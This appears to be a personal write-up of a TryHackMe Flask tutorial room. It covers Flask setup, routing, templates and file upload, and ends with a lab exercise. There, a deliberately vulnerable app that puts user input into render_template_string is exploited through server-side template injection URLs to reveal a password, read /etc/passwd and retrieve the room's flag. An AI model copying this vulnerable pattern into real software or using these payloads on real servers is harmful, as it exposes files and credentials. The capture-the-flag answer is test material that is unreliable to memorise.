---
How it works and how can I exploit it?
---

![](https://i.imgur.com/EgjVHqE.png)

![222](https://tryhackme-images.s3.amazonaws.com/room-icons/7189d9e0b1ec48e6e750491cf4dd10df.jpeg)

### Introduction

![](https://flask.palletsprojects.com/en/1.1.x/_images/flask-logo.png)

This room continues my python-frameworks series. Learning Python can be extremely useful for penetration testers, and a simple understanding of its frameworks can be a key to success. In this room (lesson), we are going to learn about one of the easiest and fastest ones. 

**Flask** is a micro web framework written in Python. It is classified as a microframework because it does not require particular tools or libraries. It has no database abstraction layer, form validation, or any other components where pre-existing third-party libraries provide common functions. However, Flask supports extensions that can add application features as if they were implemented in Flask itself. Extensions exist for object-relational mappers, form validation, upload handling, various open authentication technologies, and several common framework related tools.   
_[Source: Wikipedia]_

To be short, Flask does not require much work from you and can be coded and deployed in a matter of a couple of minutes!  
You'll find Flask especially easy if you find [Django](https://tryhackme.com/room/django) too complicated :)

[https://github.com/Swafox/Flask-examples](https://github.com/Swafox/Flask-examples) <-- Here's the collection of all scripts that are going to be used in this room.  

Answer the questions below

Let's go!

 Completed


###  Installation and Deployment basics

Let's proceed with basic installation. For this room, we are going to use Python3. You can get it for both Windows and Linux here:  
[Link](https://www.python.org/)

![](https://external-content.duckduckgo.com/iu/?u=http%3A%2F%2Fwww.vizteams.com%2Fwp-content%2Fuploads%2F2013%2F08%2Fpython-logo-master.png&f=1&nofb=1)

Now open up a terminal/cmd and install Flask by running:  
`pip3 install Flask`

After a couple of seconds, you'll get everything you need for using Flask.

Make a separate directory for your demo project and start a virtual environment there. Virtual environments are independent groups of Python libraries, one for each project. Packages installed for one project will not affect other projects or the operating system’s packages. Python 3 comes bundled with the venv module to create virtual environments. (tl;dr a virtual environment isolates your project from the system to prevent any conflicts).   
Run `pip3 install virtualenv` if you get an error running venv later on.

**On Linux run:**  

`mkdir myproject    cd myproject    python3 -m venv venv`

![](https://i.imgur.com/ACAXRSx.png)

**On Windows:**

`mkdir myproject    cd myproject    py -3 -m venv venv`

![](https://i.imgur.com/LwanGdE.png)  

  

Now you need to create and set a Flask file, aka a script that is going to contain the flask code. Create a file with a name of your choice and run the following command depending on your system:  

Windows: `set FLASK_APP=hello.py`  
Linux: `export FLASK_APP=hello.py`  
(Change **hello.py** to whatever name you came up with earlier)

  
And that's that! All you have to do now is run  
`flask run`   
or   
`flask run --host=0.0.0.0`  
to deploy a flask app locally or publically (on your network).

_Note: You are going to get an error if you deploy the app at this point since we have no code written._  
  

Answer the questions below

```
┌──(witty㉿kali)-[~]
└─$ pip3 install Flask
Defaulting to user installation because normal site-packages is not writeable
Requirement already satisfied: Flask in /usr/lib/python3/dist-packages (2.0.3)
                                                                                   
┌──(witty㉿kali)-[~]
└─$ ls
bug_hunter  Documents  Music     Public     Videos
Desktop     Downloads  Pictures  Templates
                                                                                   
┌──(witty㉿kali)-[~]
└─$ mkdir Programacion  
                                                                                   
┌──(witty㉿kali)-[~]
└─$ cd Programacion 

┌──(witty㉿kali)-[~/Programacion]
└─$ export FLASK_APP=hello.py
                                                                                   
┌──(witty㉿kali)-[~/Programacion]
└─$ ls
                                                                                   
┌──(witty㉿kali)-[~/Programacion]
└─$ flask run
 * Serving Flask app 'hello.py' (lazy loading)
 * Environment: production
   WARNING: This is a development server. Do not use it in a production deployment.
   Use a production WSGI server instead.
 * Debug mode: off
Usage: flask run [OPTIONS]
Try 'flask run --help' for help.

Error: Could not import 'hello'.


```


Which environment variable do you need to change in order to run Flask?

*FLASK_APP*

### Basic syntax and routing

Let's start with the basic 'Hello World' app:

![](https://i.imgur.com/uoavTBh.png)  

As you can see, we first imported the Flask library (line 1), then defined a variable **app** to be a flask project.   
Then we assign a function **hello_world** to the / root address of the web page. So the application should display 'Hello,  TryHackMe!' on the deployed website. Check if that's the case!

![](https://i.imgur.com/yxjkIYU.png)

You might have noticed that on line 4 we were using an `app.route` method. In Flask this allows us to create different pages and dynamic URLs. Simply make a few changes in the code and you can add a new page to our application. 

![](https://i.imgur.com/VEUMHuK.png)

Now you'll see two different messages if you browse to `http://127.0.0.1:5000/`[](http://127.0.0.1:5000/) or `http://127.0.0.1:5000/admin` [](http://127.0.0.1:5000/admin)

Answer the questions below

```
┌──(witty㉿kali)-[~/Programacion]
└─$ cat hello.py   
from flask import Flask
app = Flask(__name__)

@app.route('/')
def hello_world():
	return 'Hello, TryHackMe!'

┌──(witty㉿kali)-[~/Programacion]
└─$ export FLASK_APP=hello.py
                                                                                   
┌──(witty㉿kali)-[~/Programacion]
└─$ flask run                
 * Serving Flask app 'hello.py' (lazy loading)
 * Environment: production
   WARNING: This is a development server. Do not use it in a production deployment.
   Use a production WSGI server instead.
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on http://127.0.0.1:5000
Press CTRL+C to quit

┌──(witty㉿kali)-[~/Programacion]
└─$ flask run --port=1337
 * Serving Flask app 'hello.py' (lazy loading)
 * Environment: production
   WARNING: This is a development server. Do not use it in a production deployment.
   Use a production WSGI server instead.
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on http://127.0.0.1:1337
Press CTRL+C to quit
127.0.0.1 - - [17/Feb/2023 11:32:00] "GET / HTTP/1.1" 200 -
127.0.0.1 - - [17/Feb/2023 11:32:00] "GET /favicon.ico HTTP/1.1" 404 -

Hello, TryHackMe!

┌──(witty㉿kali)-[~/Programacion]
└─$ cat hello.py
from flask import Flask
app = Flask(__name__)

@app.route('/')
def hello_world():
	return 'Hello, TryHackMe!'

@app.route('/admin')
def admin():
	return 'Hello Admin :)'


http://127.0.0.1:1337/admin

```

![[Pasted image 20230217113055.png]]

What's the default deployment port used by Flask?

*5000*

Is it possible to change that port? (yay/nay)

*yay*


### HTTP Methods and Template Rendering

As you might already know, web applications use different HTTP methods when accessing URLs. Those usually are GET and POST. By default, a **route** (see task 3) only answers to GET requests. BUT, you can easily use the **methods** argument in the **route()** to handle different HTTP methods.

![](https://i.imgur.com/trzXKAT.png)  

Take a look at line 9. Here we are separating HTTP methods into GET and POST in order to instruct Flask on how to handle them. Inside the function, we can make python differently respond to an incoming GET or POST request. In this case, a POST request would invoke a function **do_the_login()** and everything else would call a **show_the_login_form()** one.

Now, the Flask team has made our lives easier by creating a template rendering function inside Flask. It makes Flask automatically render HTML files into a website, making it easier to handle. 

![](https://i.imgur.com/ljrUwwQ.png)

Look at the screenshot above and see how easy it is. Just add a **render_template** function and you'll get the desired result! I've also put a small HTML example for you to put inside the **template.html** file just to try it out. 

Answer the questions below

```
┌──(witty㉿kali)-[~/Programacion]
└─$ cat request.py 
from flask import request
from flask import Flask
app = Flask(__name__)

def do_the_login():
	return 'This was a POST request'

def show_the_login_form():
	return 'Not POST. Are you GETting me? :)'

@app.route('/login', methods=['GET', 'POST'])
def login():
	if request.method == 'POST':
		return do_the_login()
	else:
		return show_the_login_form()

┌──(witty㉿kali)-[~/Programacion]
└─$ export FLASK_APP=request.py
                                                    
┌──(witty㉿kali)-[~/Programacion]
└─$ flask run --port=1337      
 * Serving Flask app 'request.py' (lazy loading)
 * Environment: production
   WARNING: This is a development server. Do not use it in a production deployment.
   Use a production WSGI server instead.
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on http://127.0.0.1:1337
Press CTRL+C to quit
127.0.0.1 - - [17/Feb/2023 11:51:07] "GET / HTTP/1.1" 404 -
127.0.0.1 - - [17/Feb/2023 11:51:11] "GET /login HTTP/1.1" 200 -
127.0.0.1 - - [17/Feb/2023 11:52:05] "GET /login HTTP/1.1" 200 -


┌──(witty㉿kali)-[~/Programacion]
└─$ curl -X POST http://127.0.0.1:1337/login                                                                  
This was a POST request 

┌──(witty㉿kali)-[~/Programacion]
└─$ cat render.py 
from flask import render_template
from flask import Flask
app = Flask(__name__)

@app.route('/rendered')
def hello(name=None):
	return render_template('template.html', name=name)

https://www.digitalocean.com/community/tutorials/how-to-use-templates-in-a-flask-application

┌──(witty㉿kali)-[~/Programacion]
└─$ mkdir templates    

┌──(witty㉿kali)-[~/Programacion/templates]
└─$ nano template.html 
                                                                                                
┌──(witty㉿kali)-[~/Programacion/templates]
└─$ cat template.html 
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Hello from Flask</title>
</head>
<body>
    <h1>Hello again, TryHackMe!</h1>
</body>
</html>

┌──(witty㉿kali)-[~/Programacion]
└─$ export FLASK_APP=render.py
                                                    
┌──(witty㉿kali)-[~/Programacion]
└─$ flask run --port=1337     
 * Serving Flask app 'render.py' (lazy loading)
 * Environment: production
   WARNING: This is a development server. Do not use it in a production deployment.
   Use a production WSGI server instead.
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on http://127.0.0.1:1337
Press CTRL+C to quit
127.0.0.1 - - [17/Feb/2023 12:14:20] "GET /rendered HTTP/1.1" 200 -

view-source:http://127.0.0.1:1337/rendered

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Hello from Flask</title>
</head>
<body>
    <h1>Hello again, TryHackMe!</h1>
</body>
</html>

```


Does Flask support POST requests? (yay/nay)

*yay*

What markdown language can you use to make templates for Flask? 

*html*

###  File Upload

Flask also makes it easy for us to handle uploaded files.  
You can access those files by looking at the **files** attribute on the request object. Each uploaded **file** is stored in that dictionary. It behaves just like a standard Python file object, but it also has a **save()** method that allows you to store that file on the filesystem of the server.  
[Source: Flask documentation]  
It is important to understand that you'll need a small HTML page with an upload form for this to work. ([Example](https://www.w3schools.com/howto/howto_html_file_upload_button.asp))

  
![](https://i.imgur.com/9EZevQ8.png)

This is the way you can easily create an uploading page (**/upload**) using Flask. Flask is waiting for the POST request to be called and then uses a special **save** function to put those files somewhere on the system (you can change the location in any way you want).   
_Note: Make sure not to forget to set the **enctype="multipart/form-data"** attribute on your HTML form, otherwise the browser will not transmit your files at all._

Answer the questions below

```
┌──(witty㉿kali)-[~/Programacion]
└─$ cat fileupload.py 
from flask import request
from werkzeug.utils import secure_filename
from flask import render_template
from flask import Flask
app = Flask(__name__)

@app.route('/upload', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['filename']
        f.save('uploads/' + secure_filename(f.filename))
    return render_template('upload.html')

┌──(witty㉿kali)-[~/Programacion/templates]
└─$ cat upload.html  
<!DOCTYPE html>
<html>
<body>

<p>Click on the "Choose File" button to upload a file:</p>

<form action="{{ url_for('upload_file') }}" method="POST" enctype="multipart/form-data">
  <input type="file" id="myFile" name="filename">
  <input type="submit">
</form>
</body>
</html>

┌──(witty㉿kali)-[~/Programacion]
└─$ mkdir uploads

┌──(witty㉿kali)-[~/Programacion]
└─$ export FLASK_APP=fileupload.py
                                                                             
┌──(witty㉿kali)-[~/Programacion]
└─$ flask run --port=1337         
 * Serving Flask app 'fileupload.py' (lazy loading)
 * Environment: production
   WARNING: This is a development server. Do not use it in a production deployment.
   Use a production WSGI server instead.
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on http://127.0.0.1:1337
Press CTRL+C to quit
127.0.0.1 - - [17/Feb/2023 13:05:14] "POST /upload HTTP/1.1" 200 -
127.0.0.1 - - [17/Feb/2023 13:05:18] "POST /upload HTTP/1.1" 200 -

Now go to http://127.0.0.1:1337/upload

and upload something and will save in upload directory :)

In my case I'm uploading hello.py

┌──(witty㉿kali)-[~/Programacion/uploads]
└─$ cat hello.py   
from flask import Flask
app = Flask(__name__)

@app.route('/')
def hello_world():
	return 'Hello, TryHackMe!'

@app.route('/admin')
def admin():
	return 'Hello Admin :)'

Was really fun!

```

![[Pasted image 20230217130807.png]]

Awesome!

 Completed

### Flask Injection

 Start Machine

At this point, it looks like Flask is a great framework for young developers. It definitely is a great tool but a simple misconfiguration may lead to severe security consequences. A major vulnerability was found in Flask's template rendering. The template engine provided within the Flask framework may allow developers to introduce Server-Side Template Injection (SSTI) vulnerabilities.  An attacker can execute code within the context of the server. In some cases, it may lead to a full Remote Code Execution (RCE). 

For the sake of this room let's take a look at a bad code configuration and see how it can be used to exploit a Local File Inclusion (LFI)!

  
![](https://i.imgur.com/AEdGioa.png) _Vulnerable code_  

The main reason for this vulnerability is that Jinja2 (template rendering engine) uses curly braces to surround variables used in the template. As you can see on the line with **# Problem**, our template is put in **''' '''** brackets which allow us to abuse the Jinja template mechanism. A variable after hello is parsing a **name** from a variable person. But because this is a vulnerable code we can make it output the **password.**   
  
Go to the `MACHINE_IP:5000/vuln?name=   `  
Simply put `{{ person.password }}` at the end of the link to see the password being displayed in cleartext. 

![](https://i.imgur.com/mdERwjZ.png)  

Now let's take that vulnerability to another level and read files (LFI). `{{ get_user_file("/etc/passwd") }}`

The above string will allow you to read the **/etc/passwd** file or any other if you simply change the name.  
  
This vulnerability can be easily mitigated by using a single quotation mark (**' '**) in the template variable (instead of **''' ''''**).  It may look ridiculous, but many python developers make these kinds of mistakes, and unintentionally make their websites vulnerable to SSTI.

Answer the questions below

```python
Testing

┌──(witty㉿kali)-[~/Programacion]
└─$ cat vulnerable.py 
from flask import Flask, request, render_template_string, render_template

app = Flask(__name__)

@app.route('/vuln')
def hello_ssti():
	person = {'name':"HackerTHM", 'password':"123456789"}
	if request.args.get('name'):
		person['name'] = request.args.get('name')
	
	template = '''<h2>Hello %s!</h2>''' % person['name'] # Problem
	
	return render_template_string(template, person=person)

def get_user_file(f_name):
	with open(f_name) as f:
		return f.readlines()

app.jinja_env.globals['get_user_file'] = get_user_file

if __name__ == "__main__":
	app.run(debug=True)

┌──(witty㉿kali)-[~/Programacion]
└─$ export FLASK_APP=vulnerable.py 
                                                                 
┌──(witty㉿kali)-[~/Programacion]
└─$ flask run --port=1337         
 * Serving Flask app 'vulnerable.py' (lazy loading)
 * Environment: production
   WARNING: This is a development server. Do not use it in a production deployment.
   Use a production WSGI server instead.
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on http://127.0.0.1:1337
Press CTRL+C to quit
127.0.0.1 - - [17/Feb/2023 13:20:37] "GET / HTTP/1.1" 404 -
127.0.0.1 - - [17/Feb/2023 13:20:46] "GET /vuln HTTP/1.1" 200 -

http://127.0.0.1:1337/vuln?name={{%20person.password%20}}

Hello 123456789!

http://127.0.0.1:1337/vuln?name={{%20get_user_file(%22/etc/passwd%22)%20}}

Hello ['root:x:0:0:root:/root:/usr/bin/zsh\n', 'daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n'
....

http://127.0.0.1:1337/vuln?name={{%20get_user_file(%22/home/witty/Programacion/vulnerable.py%22)%20}}

Hello ['from flask import Flask, request, render_template_string, render_template\n', '\n', 'app = Flask(__name__)\n', '\n', "@app.route('/vuln')\n", 'def hello_ssti():\n', '\tperson = {\'name\':"HackerTHM", \'password\':"123456789"}\n', "\tif request.args.get('name'):\n", "\t\tperson['name'] = request.args.get('name')\n", '\t\n', "\ttemplate = '''<h2>Hello %s!</h2>''' % person['name'] # Problem\n", '\t\n', '\treturn render_template_string(template, person=person)\n', '\n', 'def get_user_file(f_name):\n', '\twith open(f_name) as f:\n', '\t\treturn f.readlines()\n', '\n', "app.jinja_env.globals['get_user_file'] = get_user_file\n", '\n', 'if __name__ == "__main__":\n', '\tapp.run(debug=True)\n']!

http://10.10.251.224:5000/vuln?name={{%20get_user_file(%22/home/flask/flag.txt%22)%20}}

Hello ['THM{flask_1njected}\n']!

```


What's inside **/home/flask/flag.txt** ?

*THM{flask_1njected}*

### References and Sources

![222](https://i.imgur.com/Vbqvn65.png)  

Thank you for completing this room! Make sure to code something in Flask :)  

- Entire room:  
[Flask documentation](https://flask.palletsprojects.com/en/1.1.x/)  
[TutorialSploit](https://www.tutorialspoint.com/flask/index.htm)

- Task 6:  

[Injecting Flask](https://blog.nvisium.com/injecting-flask) [by nVisium](https://blog.nvisium.com/injecting-flask)  

  
- Task 5:

[Flask Uploads](https://pythonhosted.org/Flask-Uploads/)

Answer the questions below

See you in the next room!

 Completed


[[MD2PDF]]